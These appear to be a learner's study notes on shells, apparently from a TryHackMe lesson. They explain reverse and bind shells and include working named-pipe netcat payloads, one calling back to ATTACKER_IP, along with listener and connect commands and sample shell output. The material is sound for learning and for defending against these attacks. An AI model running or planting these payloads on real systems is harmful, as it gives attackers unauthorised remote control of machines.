### What is a Shell?

A shell is software that allows a user to interact with an OS. It can be a graphical interface, but it is usually a command-line interface, and this will depend on the operating system running on the target system.
## What attackers can do with a shell

🖥️ ==`Remote System Control`== : Run commands or software on the target machine from afar.
 
⬆️ ==`Privilege Escalation`== : Upgrade from limited access (user) to higher access (admin/root).

📤 ==`Data Exfiltration`== : Search for, read, and copy sensitive files or data.

🔁 ==`Persistence`== : 

Maintain access by:  Creating users, Adding credentials ,Installing backdoors

🧪 ==`Post‑Exploitation`== : 

Perform actions after initial access, such as: Deploying malware, Creating hidden accounts ,Deleting logs or data

🌐 ==`Pivoting`== : Use the compromised system as a **launch point** to attack other systems on the same network.

---
# Reverse Shell

A reverse shell, sometimes referred to as a "connect back shell," is one of the most popular techniques for gaining access to a system in cyberattacks. The connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances.

### ==`How Reverse Shells Work`==
#### **Set up a Netcat (nc) Listener**

As mentioned above, a reverse shell will connect back to the attacker's machine. This machine will be waiting for a connection, so let's use Netcat to listen to a connection using the following command `nc -lvnp 443`.  

```shell-session
attacker@kali:~$ nc -lvnp 443
listening on [any] 4444 ...
```

- `-l`: listen
- `-v`: verbose
- `-n`: no DNS (The `-n` option prevents the connections from using DNS for lookup, so it will not resolve any hostname it will use an IP address)
- `-p`: port
- Common ports (53, 80, 443, etc.) help blend with normal traffic.

As an example, let's analyze an example payload named a **pipe reverse shell**, as shown below.

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

- `rm -f /tmp/f` → Removes any existing pipe to avoid conflicts
- `mkfifo /tmp/f` → Creates a named pipe (FIFO) for two-way communication
- `cat /tmp/f` → Reads commands sent through the pipe
- `| sh -i 2>&1` → Executes commands in an interactive shell and sends errors + output
- `| nc ATTACKER_IP ATTACKER_PORT` → Sends shell I/O to attacker via Netcat
- `>/tmp/f` → Sends attacker input back into the pipe

##### **Attacker Receives the Shell**

Once the above payload is executed, the attacker will receive a **reverse shell**, as shown below, allowing them to execute commands as if they were logging into a regular terminal in the OS.

**Attacker Terminal Output (Receiving Shell)**
```shell-session
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

target@tryhackme:~$
```

The output above shows the connection coming from the IP `10.10.13.37`, which is the IP address of the compromised target.
# Reverse Shell Cheat Sheet
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

---
# Bind Shell

As the name indicates, a bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely.

- **Bind shell:** Target opens (binds) a port and listens; attacker connects to it to get a shell.
- **Use case:** When the target **cannot make outbound connections**.
- **Downside:** Easier to detect since it listens on an open port.

**Bind Shell Payload (run on target):**
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

- `rm -f /tmp/f` → Removes existing pipe
- `mkfifo /tmp/f` → Creates FIFO for two-way communication
- `cat /tmp/f` → Reads attacker input
- `| bash -i 2>&1` → Interactive shell with error/output redirection
- `| nc -l 0.0.0.0 8080` → Netcat listens on all interfaces, port 8080
- `>/tmp/f` → Sends output back into the pipe

> Ports **<1024 require root**, so 8080 avoids privilege issues.

**Attacker connects:**
```
nc -nv TARGET_IP 8080
```
- `-n` → No DNS
- `-v` → Verbose
- Connects to the listening bind shell

**Result:**  
Attacker gets an interactive shell on the target system.


![[Pasted image 20260211000917.png]]